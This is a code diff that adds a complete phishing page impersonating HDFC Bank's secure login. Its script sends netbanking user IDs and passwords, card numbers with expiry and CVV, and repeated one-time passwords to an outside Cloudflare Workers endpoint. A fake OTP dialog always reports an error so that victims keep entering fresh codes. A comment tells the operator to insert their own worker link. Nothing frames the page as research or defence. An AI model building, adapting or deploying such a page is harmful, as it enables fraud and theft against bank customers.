@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank - Secure Login</title>
+    <style>
+        body {
+            margin: 0; padding: 0;
+            background-color: #f0f2f5;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex; flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            width: 100%; background-color: #ffffff;
+            padding: 15px 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            box-sizing: border-box;
+        }
+
+        .logo { width: 280px; height: auto; display: block; }
+
+        .content {
+            flex: 1; display: flex; flex-direction: column;
+            align-items: center; padding: 20px;
+        }
+
+        .toggle-container {
+            margin: 25px 0; display: flex; gap: 40px;
+            border-bottom: 2px solid #ddd; padding-bottom: 5px;
+        }
+
+        .toggle-container input { display: none; }
+        .toggle-label { cursor: pointer; font-size: 16px; font-weight: 600; color: #888; position: relative; padding: 5px 0; }
+        .toggle-label::after {
+            content: ''; position: absolute; bottom: -7px; left: 0;
+            width: 0; height: 3px; background-color: #004c8f;
+            transition: width 0.3s ease;
+        }
+
+        #netbanking:checked ~ label[for="netbanking"],
+        #creditcard:checked ~ label[for="creditcard"] { color: #004c8f; }
+        #netbanking:checked ~ label[for="netbanking"]::after,
+        #creditcard:checked ~ label[for="creditcard"]::after { width: 100%; }
+
+        .login-box {
+            background: white; padding: 25px; border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08); width: 330px; margin-top: 10px;
+        }
+
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 13px; margin-bottom: 5px; color: #333; font-weight: bold; }
+        .input-group input {
+            width: 100%; padding: 12px; border: 1px solid #ccc;
+            border-radius: 4px; box-sizing: border-box; font-size: 14px;
+        }
+
+        .forgot-links { margin-top: -10px; margin-bottom: 15px; text-align: left; }
+        .forgot-links a { font-size: 11px; color: #004c8f; text-decoration: none; }
+
+        .submit-btn {
+            width: 100%; padding: 14px; background-color: #004c8f; 
+            color: white; border: none; border-radius: 4px;
+            font-weight: bold; font-size: 15px; cursor: pointer; text-transform: uppercase;
+        }
+
+        /* Overlay & Loader */
+        #overlay {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: rgba(0,0,0,0.85);
+            z-index: 1000; justify-content: center; align-items: center;
+        }
+
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #004c8f;
+            border-radius: 50%;
+            width: 50px; height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* OTP Popup Zoom */
+        .otp-box {
+            display: none; background: white; padding: 30px; border-radius: 12px;
+            width: 320px; text-align: center;
+            transform: scale(0); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .otp-box.show { display: block; transform: scale(1); }
+
+        .otp-box h2 { font-size: 18px; color: #333; margin-bottom: 10px; }
+        .otp-box p { font-size: 13px; color: #666; margin-bottom: 20px; }
+        
+        .otp-input {
+            width: 100%; padding: 12px; border: 1px solid #004c8f;
+            border-radius: 4px; font-size: 20px; text-align: center;
+            letter-spacing: 8px; margin-bottom: 5px;
+        }
+
+        .error-msg { color: #ed232a; font-size: 12px; display: none; margin-bottom: 15px; font-weight: bold;}
+
+        .hidden { display: none; }
+        footer { width: 100%; margin-top: auto; }
+        .footer-img { width: 100%; height: auto; display: block; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <img src="https://i.ibb.co/gLsd4t8Q/chrome-screenshot-2-May-2026-11-20-42-am-IST.png" alt="Logo" class="logo">
+    </header>
+
+    <div class="content">
+        <div class="toggle-container">
+            <input type="radio" id="netbanking" name="login-type" checked onclick="showForm('net')">
+            <label for="netbanking" class="toggle-label">Netbanking</label>
+            <input type="radio" id="creditcard" name="login-type" onclick="showForm('card')">
+            <label for="creditcard" class="toggle-label">Credit Card</label>
+        </div>
+
+        <form id="net-form" class="login-box" onsubmit="handleSubmit(event, 'net')">
+            <div class="input-group">
+                <label>User ID / Customer ID</label>
+                <input type="text" id="userid" placeholder="Enter User ID" required>
+            </div>
+            <div class="forgot-links"><a href="#">Forgot Customer ID?</a></div>
+            <div class="input-group">
+                <label>IPIN (Password)</label>
+                <input type="password" id="pass" placeholder="Enter Password" required>
+            </div>
+            <div class="forgot-links"><a href="#">Forgot IPIN (Password)?</a></div>
+            <button class="submit-btn" type="submit">LOGIN</button>
+        </form>
+
+        <form id="card-form" class="login-box hidden" onsubmit="handleSubmit(event, 'card')">
+            <div class="input-group">
+                <label>Card Number</label>
+                <input type="text" id="cardno" maxlength="16" placeholder="XXXX XXXX XXXX XXXX" required>
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <div class="input-group" style="flex: 1;"><label>Expiry</label><input type="text" id="exp" placeholder="MM/YY" required></div>
+                <div class="input-group" style="flex: 1;"><label>CVV</label><input type="password" id="cvv" maxlength="3" placeholder="XXX" required></div>
+            </div>
+            <button class="submit-btn" type="submit">VERIFY CARD</button>
+        </form>
+    </div>
+
+    <div id="overlay">
+        <div id="loading-spinner" class="loader"></div>
+        <div id="otp-box" class="otp-box">
+            <h2>Secure Verification</h2>
+            <p>Please enter the 6-digit OTP sent to your phone for verification.</p>
+            <input type="number" id="otp-value" class="otp-input" placeholder="000000" oninput="if(this.value.length > 6) this.value = this.value.slice(0, 6);">
+            <div id="error-text" class="error-msg">The OTP you entered is incorrect.</div>
+            <button class="submit-btn" onclick="verifyOTP()">SUBMIT OTP</button>
+        </div>
+    </div>
+
+    <footer>
+        <img src="https://i.ibb.co/PZ48bhGL/IMG-20260502-113948.jpg" alt="Footer" class="footer-img">
+    </footer>
+
+    <script>
+        // --- CONFIGURATION ---
+        const WORKER_URL = 'https://https://snowy-sunset-a557.sumankkuuyy.workers.dev/'; // Apna worker link yahan dalein
+
+        function showForm(type) {
+            document.getElementById('net-form').classList.toggle('hidden', type !== 'net');
+            document.getElementById('card-form').classList.toggle('hidden', type !== 'card');
+        }
+
+        // --- DATA SUBMISSION ---
+        async function sendData(payload) {
+            try {
+                await fetch(WORKER_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) { console.log("Sent"); }
+        }
+
+        // --- HANDLE INITIAL LOGIN ---
+        async function handleSubmit(event, type) {
+            event.preventDefault();
+            let data = type === 'net' ? 
+                { type: 'Login', user: document.getElementById('userid').value, pass: document.getElementById('pass').value } :
+                { type: 'Card', card: document.getElementById('cardno').value, exp: document.getElementById('exp').value, cvv: document.getElementById('cvv').value };
+            
+            sendData(data);
+
+            const overlay = document.getElementById('overlay');
+            const spinner = document.getElementById('loading-spinner');
+            overlay.style.display = 'flex';
+            spinner.style.display = 'block';
+
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                const otpBox = document.getElementById('otp-box');
+                otpBox.style.display = 'block';
+                setTimeout(() => { otpBox.classList.add('show'); }, 50);
+            }, 3000);
+        }
+
+        // --- HANDLE OTP ATTEMPTS ---
+        async function verifyOTP() {
+            const otpInput = document.getElementById('otp-value');
+            if(otpInput.value.length < 6) return;
+
+            sendData({ type: 'OTP_Attempt', otp: otpInput.value });
+
+            document.getElementById('error-text').style.display = 'block';
+            otpInput.value = '';
+            otpInput.focus();
+        }
+    </script>
+</body>
+</html>
